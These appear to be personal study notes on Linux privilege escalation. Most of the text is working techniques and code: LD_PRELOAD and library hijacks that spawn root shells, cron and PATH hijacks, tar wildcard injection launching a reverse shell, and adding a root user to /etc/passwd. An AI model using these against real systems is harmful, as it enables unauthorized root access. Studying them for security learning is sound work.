# LINUX Privesc notes 

- linux smart enum script - https://github.com/diego-treitos/linux-smart-enumeration, linpeas can be used too
- reverse shell suggester suggester - https://github.com/mthbernardes/rsg
- Cheatsheet - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

## kernel exploit 
- searchsploitlinuxkernel 2.6 privesc debian
- ./linux-exploit-suggester-2.pl –k 2.6.32 (https://github.com/jondonas/linux-exploit-suggester-2)

## services running as root
- ps aux | grep '^root' (to list services running as root)
- use --version flag to get the exact version of the service 
- search exploits - exploitdb,google,github etc 

## weak file perms 
- find /etc -maxdepth 1 -writable -type f (list all wirtable files)
- find /etc -maxdepth 1 -readable -type f (list all readable files)
- find / -executable -writable -type d 2- /dev/null (list directories that can be written to)

-check the /etc/shadow and the /etc/password file, if they are read/write-able (the hash in /etc/password has precedence over /etc/shadow)
- we can also append a new row to /etc/passwd for a new user with uid,gid same as root

## backups 
- valuable info as backups 
- dirs to check - /home/user, /, /var/backups, /tmp

## sudo 
- sudo su (if no restrictions on programs that can be executed with sudo)
other ways:
$ sudo -s
$ sudo -i
$ sudo /bin/bash
$ sudo passwd

- sudo -l (list programs this user can & cannot execute with sudo priv)
- then use https://gtfobins.github.io/ to get escape sequence of that program 

## using errors to view restricted files
```
$ sudo apache2 -f /etc/shadow 
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

## SUID & SGID
- find / -type f -a \\( -perm -u+s-o -perm -g+s\\) -exec ls -l {} \; 2> /dev/null (to find suid,sgid files)
- get names and versions of these programs and search for their exploits searchsploit, github, google

## Environment variables 
### LD_PRELOAD (loads the shared obj specified before others)
- sudo -l (check env_reset and whether env_keep includes LD_PRELOAD)
- create a file like:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");}
```
- compile it to .so (shared object)
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
- sudo LD_PRELOAD=/tmp/preload.so apache2 (running any sudo program like this will give root shell)

### LD_LIBRARY_PATH (searches for shared libraries in given path)
- ldd /usr/sbin/apache2 (prints the shared libraries used by a program)
- choose one shared library (its a hit or miss so try diff libs till it works)
- create a file 
```
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");}
```
- compile it same name as shared lib 
```
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```
- sudo LD_LIBRARY_PATH=. apache2 (giving path as current dir and root shell is obtained)

## CronJobs
- scripts that can be run as root in time intervals
- /var/spool/cron/ or /var/spool/cron/crontabs/ (user crontab)
- /etc/crontab (system wide crontabs)
- try to write to script run as cronjob or replace it with own script
If a cronjob program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cronjob for eg:
```
#!/bin/bash 
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
 ``` 
then give it executable permissions (ensure that it is in a directory thats listed in PATH before the actual cronjob scrript)

## Wildcard and Filenames
- --option=key=value (we can create filenames like this to give complex options GTFOBins for more options)
- if a command in the cronjob script runs with wildcard char * 
eg:
```
$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
gtfobins tells us that tar can use checkpoint flag
We use msfvenom to make an elf payload for reverse shell
and create two files :
```
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=shell.elf
```
listening with nc will give root shell

## SUID/SGID contd
- check suid/sgid files
### shared objects
- if a file name looks like it uses shared objs ('so') that it cant find, run strace on it 
- if it looks for a .so file and isnt able to find it, compile our own with code to spawn a root shell with name as the .so script wants 
eg:
```
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    setuid(0);
    system("/bin/bash -p");}
```
running suid script will give root

### incomplete PATH 
- if it doesnt use full sys path for a command, compile code to spawn root with name as that command in a dir thats early in $PATH
similar code to that above 
running suid script will give root

### export functions ( bash < 4.2-048)
- if bash lower than 4.2-048 
in eg: a suid script uses /usr/bin/service 
- we can create func with name /usr/bin/service and export it 
```
$ function /usr/sbin/service { /bin/bash -p; }
$ export –f /usr/sbin/service
```
running the suid script will give root

## SHELLOPTS & PS4

## Look for creds in bash_history and config files

## NFS
- if a mount dir has option no_root_sqaush 
- move a rev shell script with suid bit set in that dir from ur pc 
- exxecuting that will give root shell 
